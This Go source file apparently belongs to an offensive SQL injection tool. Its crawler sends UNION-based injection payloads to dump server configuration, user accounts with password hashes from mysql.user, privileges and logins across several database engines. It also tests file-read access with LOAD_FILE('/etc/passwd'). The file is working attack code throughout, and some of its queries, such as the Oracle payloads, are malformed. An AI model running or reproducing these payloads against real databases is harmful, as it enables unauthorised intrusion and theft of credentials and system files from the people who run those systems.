package crawl

import (
	"fmt"
	"strings"
	"hackit/sqli/go/utils"
)

// SystemCrawler extracts system-level information, config, users, privileges
type SystemCrawler struct {
	engine EngineInterface
	log    *utils.Logger
}

func NewSystemCrawler(e EngineInterface) *SystemCrawler {
	return &SystemCrawler{engine: e, log: e.GetLogger()}
}

// ExtractSystemInfo extracts comprehensive system information
func (sc *SystemCrawler) ExtractSystemInfo(param, dbms string) map[string]string {
	info := make(map[string]string)

	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		sc.extractMySQLSystemInfo(param, info)
	case strings.Contains(dbms, "PostgreSQL"):
		sc.extractPostgresSystemInfo(param, info)
	case strings.Contains(dbms, "MSSQL"):
		sc.extractMSSQLSystemInfo(param, info)
	case strings.Contains(dbms, "Oracle"):
		sc.extractOracleSystemInfo(param, info)
	case strings.Contains(dbms, "SQLite"):
		sc.extractSQLiteSystemInfo(param, info)
	}

	return info
}

func (sc *SystemCrawler) extractMySQLSystemInfo(param string, info map[string]string) {
	queries := map[string]string{
		"Version":       "@@VERSION",
		"User":          "USER()",
		"Current User":  "CURRENT_USER()",
		"Database":      "DATABASE()",
		"Hostname":      "@@HOSTNAME",
		"Port":          "@@PORT",
		"Data Dir":      "@@DATADIR",
		"Temp Dir":      "@@TMPDIR",
		"Base Dir":      "@@BASEDIR",
		"Plugin Dir":    "@@PLUGINDIR",
		"Server ID":     "@@SERVER_ID",
		"Charset":       "@@CHARACTER_SET_SERVER",
		"Collation":     "@@COLLATION_SERVER",
		"Uptime":        "VERSION()", // Use as proxy
		"Threads":       "@@THREAD_CACHE_SIZE",
		"Max Conn":      "@@MAX_CONNECTIONS",
		"Timeouts":      "@@WAIT_TIMEOUT",
		"Secure Auth":   "@@SECURE_AUTH",
		"Have SSL":      "@@HAVE_SSL",
		"Have Symlink":  "@@HAVE_SYMLINK",
		"Log Bin":       "@@LOG_BIN",
		"Read Only":     "@@READ_ONLY",
		"Skip Grant":    "@@SKIP_GRANT_TABLES",
		"OOM Score":     "IFNULL(@@OOM_SCORE_ADJ, 'N/A')",
	}

	for name, expr := range queries {
		payload := fmt.Sprintf("' UNION SELECT %s-- -", expr)
		body, _, _, err := sc.engine.Request(payload, param)
		if err == nil {
			val := sc.extractValue(body)
			if val != "" {
				info[name] = val
			}
		}
	}

	// Extract users
	sc.extractSystemList(param, "SELECT CONCAT(User,'@',Host) FROM mysql.user", "Users", info)
	// Extract databases with size
	sc.extractSystemList(param, "SELECT CONCAT(SCHEMA_NAME,' (',IFNULL(ROUND(SUM(DATA_LENGTH+INDEX_LENGTH)/1024/1024,2),0),' MB)') FROM INFORMATION_SCHEMA.SCHEMATA LEFT JOIN INFORMATION_SCHEMA.TABLES USING(SCHEMA_NAME) GROUP BY SCHEMA_NAME", "DBs Sizes", info)
	// Extract grants
	sc.extractSystemList(param, "SELECT CONCAT(GRANTEE,': ',PRIVILEGE_TYPE) FROM INFORMATION_SCHEMA.USER_PRIVILEGES", "Privileges", info)
}

func (sc *SystemCrawler) extractPostgresSystemInfo(param string, info map[string]string) {
	queries := map[string]string{
		"Version":       "VERSION()",
		"Current User":  "current_user",
		"Current DB":    "current_database()",
		"Host":          "inet_server_addr()",
		"Port":          "inet_server_port()",
		"PostGIS":       "postgis_version()",
		"SSL":           "ssl_is_used()",
	}

	for name, expr := range queries {
		payload := fmt.Sprintf("' UNION SELECT %s-- -", expr)
		body, _, _, err := sc.engine.Request(payload, param)
		if err == nil {
			val := sc.extractValue(body)
			if val != "" {
				info[name] = val
			}
		}
	}

	// Users and roles
	sc.extractSystemList(param, "SELECT rolname FROM pg_roles", "Roles", info)
	// Config
	sc.extractSystemList(param, "SELECT name||'='||setting FROM pg_settings WHERE category='File Locations'", "Config", info)
}

func (sc *SystemCrawler) extractMSSQLSystemInfo(param string, info map[string]string) {
	queries := map[string]string{
		"Version":       "@@VERSION",
		"User":          "SYSTEM_USER",
		"DB Name":       "DB_NAME()",
		"Hostname":      "HOST_NAME()",
		"Service":       "@@SERVICENAME",
		"Language":      "@@LANGUAGE",
		"ServerName":    "@@SERVERNAME",
		"IsClone":       "SERVERPROPERTY('IsCloned')",
		"Collation":     "SERVERPROPERTY('Collation')",
		"Edition":       "SERVERPROPERTY('Edition')",
		"Engine Edition":"SERVERPROPERTY('EngineEdition')",
		"ProcessID":     "@@SPID",
	}

	for name, expr := range queries {
		payload := fmt.Sprintf("' UNION SELECT %s-- -", expr)
		body, _, _, err := sc.engine.Request(payload, param)
		if err == nil {
			val := sc.extractValue(body)
			if val != "" {
				info[name] = val
			}
		}
	}

	// Logins
	sc.extractSystemList(param, "SELECT name FROM sys.sql_logins", "SQL Logins", info)
	// Databases sizes
	sc.extractSystemList(param, "SELECT name+': '+CONVERT(VARCHAR,SUM(size)*8/1024)+' MB' FROM sys.master_files GROUP BY name", "DB Sizes", info)
}

func (sc *SystemCrawler) extractOracleSystemInfo(param string, info map[string]string) {
	queries := map[string]string{
		"Version":   "SELECT * FROM v$version",
		"User":      "USER FROM DUAL",
		"DB Name":   "NAME FROM v$database",
		"Instance":  "INSTANCE_NAME FROM v$instance",
		"Hostname":  "HOST_NAME FROM v$instance",
	}

	for name, expr := range queries {
		payload := fmt.Sprintf("' UNION SELECT %s-- -", expr)
		body, _, _, err := sc.engine.Request(payload, param)
		if err == nil {
			val := sc.extractValue(body)
			if val != "" {
				info[name] = val
			}
		}
	}

	sc.extractSystemList(param, "SELECT username FROM all_users", "Users", info)
}

func (sc *SystemCrawler) extractSQLiteSystemInfo(param string, info map[string]string) {
	queries := map[string]string{
		"Version": "sqlite_version()",
	}

	for name, expr := range queries {
		payload := fmt.Sprintf("' UNION SELECT %s-- -", expr)
		body, _, _, err := sc.engine.Request(payload, param)
		if err == nil {
			val := sc.extractValue(body)
			if val != "" {
				info[name] = val
			}
		}
	}
}

// ExtractAllUsers extracts all database users with privileges
func (sc *SystemCrawler) ExtractAllUsers(param, dbms string) []map[string]string {
	var users []map[string]string

	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		query = "SELECT CONCAT(User,'@',Host), Password, IF(Super_priv='Y','YES','NO'), IF(File_priv='Y','YES','NO'), IF(Create_priv='Y','YES','NO'), IF(Drop_priv='Y','YES','NO'), IF(Grant_priv='Y','YES','NO'), IF(Shutdown_priv='Y','YES','NO') FROM mysql.user"
	case strings.Contains(dbms, "PostgreSQL"):
		query = "SELECT rolname, '***', rolsuper, rolinherit, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication FROM pg_roles"
	default:
		return users
	}

	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := sc.engine.Request(payload, param)
	if err != nil {
		return users
	}

	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 3 {
			user := map[string]string{
				"user": strings.Trim(parts[0], "'\" "),
				"auth": strings.Trim(parts[1], "'\" "),
			}
			if len(parts) >= 3 {
				user["super"] = strings.Trim(parts[2], "'\" ")
			}
			users = append(users, user)
		}
	}
	return users
}

// ExtractGlobalVariables extracts all accessible global variables
func (sc *SystemCrawler) ExtractGlobalVariables(param, dbms string) map[string]string {
	vars := make(map[string]string)

	if strings.Contains(dbms, "MySQL") || strings.Contains(dbms, "MariaDB") {
		query := "SELECT CONCAT(VARIABLE_NAME,'=',VARIABLE_VALUE) FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME IN ('version','hostname','port','datadir','basedir','plugin_dir','max_connections','wait_timeout','interactive_timeout','secure_auth','have_ssl','skip_grant_tables','read_only','log_bin','server_id','character_set_server','collation_server','thread_cache_size','back_log','max_allowed_packet','connect_timeout','lock_wait_timeout','tmp_table_size','max_heap_table_size','query_cache_size','query_cache_type','innodb_buffer_pool_size','innodb_log_file_size','innodb_flush_log_at_trx_commit','sql_mode','general_log','slow_query_log')"
		payload := fmt.Sprintf("' UNION SELECT %s-- -", query)
		body, _, _, err := sc.engine.Request(payload, param)
		if err == nil {
			lines := strings.Split(body, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if strings.Contains(line, "=") {
					parts := strings.SplitN(line, "=", 2)
					if len(parts) == 2 {
						vars[strings.Trim(parts[0], "'\" ")] = strings.Trim(parts[1], "'\" ")
					}
				}
			}
		}
	}

	return vars
}

func (sc *SystemCrawler) extractValue(body string) string {
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) > 0 && len(line) < 500 && !strings.HasPrefix(line, "<") && !strings.HasPrefix(line, "<!") {
			return strings.Trim(line, "'\" ")
		}
	}
	return ""
}

func (sc *SystemCrawler) extractSystemList(param, query, key string, info map[string]string) {
	payload := fmt.Sprintf("' UNION SELECT %s-- -", query)
	body, _, _, err := sc.engine.Request(payload, param)
	if err != nil {
		return
	}

	var items []string
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) > 0 && len(line) < 300 && !strings.HasPrefix(line, "<") {
			items = append(items, strings.Trim(line, "'\" "))
		}
	}
	if len(items) > 0 {
		info[key] = strings.Join(items, ", ")
	}
}

// ExtractFilePrivileges checks for file read/write capabilities
func (sc *SystemCrawler) ExtractFilePrivileges(param, dbms string) map[string]bool {
	privs := map[string]bool{
		"file_read":  false,
		"file_write": false,
	}

	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		// Check if FILE privilege exists
		queries := []struct {
			name    string
			query   string
			target  string
		}{
			{"file_read", "SELECT IF(File_priv='Y','YES','NO') FROM mysql.user WHERE User=CURRENT_USER()", "YES"},
			{"file_write", "SELECT IF(File_priv='Y','YES','NO') FROM mysql.user WHERE User=CURRENT_USER()", "YES"},
		}
		for _, q := range queries {
			payload := fmt.Sprintf("' UNION SELECT %s-- -", q.query)
			body, _, _, err := sc.engine.Request(payload, param)
			if err == nil && strings.Contains(body, q.target) {
				privs[q.name] = true
			}
		}

		// Also try to read a file to verify
		if privs["file_read"] {
			testQuery := "LOAD_FILE('/etc/passwd')"
			payload := fmt.Sprintf("' UNION SELECT %s-- -", testQuery)
			body, _, _, err := sc.engine.Request(payload, param)
			privs["file_read"] = err == nil && len(body) > 100
		}
	}

	return privs
}
